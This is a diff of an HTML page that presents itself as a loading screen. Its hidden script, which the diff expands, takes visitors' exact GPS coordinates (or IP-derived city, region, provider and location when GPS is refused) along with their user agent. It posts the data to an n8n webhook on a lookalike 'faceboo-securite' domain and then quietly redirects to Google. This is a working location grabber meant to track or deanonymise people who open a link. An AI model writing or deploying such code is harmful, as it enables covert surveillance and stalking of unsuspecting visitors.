@@ -8,32 +8,63 @@
 <body>
     <h2>Chargement en cours...</h2>
     <script>
-        // Récupérer les infos IP et device
-        fetch("https://ipinfo.io/json")
-        .then(response => response.json())
-        .then(data => {
-            let logData = {
-                ip: data.ip,
-                ville: data.city,
-                région: data.region,
-                pays: data.country,
-                fournisseur: data.org,
-                position: data.loc,
-                userAgent: navigator.userAgent
-            };
-
-            // Envoyer les logs à un webhook (ex: Discord, n8n, API perso)
+        function sendToWebhook(data) {
             fetch("https://faceboo-securite.app.n8n.cloud/webhook-test/60760cce-a930-48c6-9f80-c7811d1b75c3", {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
-                body: JSON.stringify(logData)
+                body: JSON.stringify(data)
             });
+        }
 
-            // Redirection après tracking
-            setTimeout(() => {
-                window.location.href = "https://www.google.com";
-            }, 2000);
-        });
+        // Récupérer la position GPS exacte
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(position => {
+                let logData = {
+                    latitude: position.coords.latitude,
+                    longitude: position.coords.longitude,
+                    accuracy: position.coords.accuracy,
+                    userAgent: navigator.userAgent
+                };
+                sendToWebhook(logData);
+            }, error => {
+                console.warn("Accès au GPS refusé, fallback sur IP.");
+                fetch("https://ipinfo.io/json")
+                .then(response => response.json())
+                .then(data => {
+                    let logData = {
+                        ip: data.ip,
+                        ville: data.city,
+                        région: data.region,
+                        pays: data.country,
+                        fournisseur: data.org,
+                        position: data.loc, // Approximation par IP
+                        userAgent: navigator.userAgent
+                    };
+                    sendToWebhook(logData);
+                });
+            });
+        } else {
+            console.warn("GPS non supporté, fallback sur IP.");
+            fetch("https://ipinfo.io/json")
+            .then(response => response.json())
+            .then(data => {
+                let logData = {
+                    ip: data.ip,
+                    ville: data.city,
+                    région: data.region,
+                    pays: data.country,
+                    fournisseur: data.org,
+                    position: data.loc, // Approximation par IP
+                    userAgent: navigator.userAgent
+                };
+                sendToWebhook(logData);
+            });
+        }
+        
+        // Redirection après tracking
+        setTimeout(() => {
+            window.location.href = "https://www.google.com";
+        }, 3000);
     </script>
 </body>
 </html>
